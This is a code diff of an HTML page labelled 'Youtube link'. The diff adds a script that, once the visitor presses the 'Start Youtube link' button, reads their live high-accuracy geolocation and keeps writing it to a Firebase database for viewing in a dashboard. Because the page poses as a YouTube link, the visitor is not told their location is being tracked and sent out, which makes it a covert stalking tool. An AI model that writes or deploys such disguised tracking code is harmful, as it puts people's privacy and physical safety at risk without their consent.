@@ -13,15 +13,30 @@
 </head>
 <body>
   <h1>Youtube link</h1>
-  <p>Click Here.</p>
-
+  <p></p>
   <button id="start">Start Youtube link</button>
- 
 
   <div id="output">No data yet.</div>
   <div class="status" id="status"></div>
 
-  <script>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+    // Paste your config here:
+    const firebaseConfig = {
+      apiKey: "...",
+      authDomain: "...",
+      databaseURL: "...",
+      projectId: "...",
+      storageBucket: "...",
+      messagingSenderId: "...",
+      appId: "..."
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
     const output = document.getElementById('output');
     const status = document.getElementById('status');
     const startBtn = document.getElementById('start');
@@ -29,24 +44,30 @@
     let watchId = null;
     let count = 0;
 
+    // A simple ID so you can tell users apart in the dashboard.
+    const userId = prompt("Enter your name or ID for this session:") || "anonymous";
+
     startBtn.addEventListener('click', () => {
       if (!navigator.geolocation) {
-        output.textContent = 'Geolocation not supported by this browser.';
+        output.textContent = 'Geolocation not supported.';
         return;
       }
-
       watchId = navigator.geolocation.watchPosition(
         (position) => {
           const { latitude, longitude, accuracy } = position.coords;
           count++;
           output.textContent =
-            `Latitude:  ${latitude}\n` +
-            `Longitude: ${longitude}\n` +
-            `Accuracy:  ±${accuracy} m\n` +
+            `Latitude:  ${latitude}\nLongitude: ${longitude}\nAccuracy:  ±${accuracy} m\n` +
             `Updated:   ${new Date(position.timestamp).toLocaleTimeString()}`;
-          status.textContent = `Live — ${count} update(s) received.`;
-          console.log(latitude, longitude);
-          // To send to a backend, POST { latitude, longitude } here.
+          status.textContent = `Live — ${count} update(s) sent.`;
+
+          // Write this update to Firebase:
+          const userRef = ref(db, 'locations/' + userId);
+          set(userRef, {
+            latitude, longitude, accuracy,
+            timestamp: position.timestamp,
+            updatedAt: new Date().toISOString()
+          });
         },
         (error) => {
           output.textContent = 'Error: ' + error.message;
@@ -54,17 +75,12 @@
         },
         { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
       );
-
       startBtn.disabled = true;
       stopBtn.disabled = false;
-      status.textContent = 'Starting…';
     });
 
     stopBtn.addEventListener('click', () => {
-      if (watchId !== null) {
-        navigator.geolocation.clearWatch(watchId);
-        watchId = null;
-      }
+      if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
       startBtn.disabled = false;
       stopBtn.disabled = true;
       status.textContent = `Stopped after ${count} update(s).`;
